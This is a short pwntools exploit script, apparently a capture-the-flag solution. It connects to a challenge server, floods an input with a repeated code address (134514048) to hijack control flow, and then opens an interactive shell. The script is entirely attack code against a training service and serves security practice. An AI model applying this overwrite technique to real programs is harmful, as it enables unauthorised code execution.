from pwn import *

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10121

r = remote(host, port)

DarkSoul = b'134514048'
payload = b' '.join([DarkSoul] * 127)

r.recvuntil(':')
r.sendline(b'127')
r.recvuntil(':')
r.sendline(payload)
r.recvuntil(':')
r.sendline(b'-1')

r.interactive()
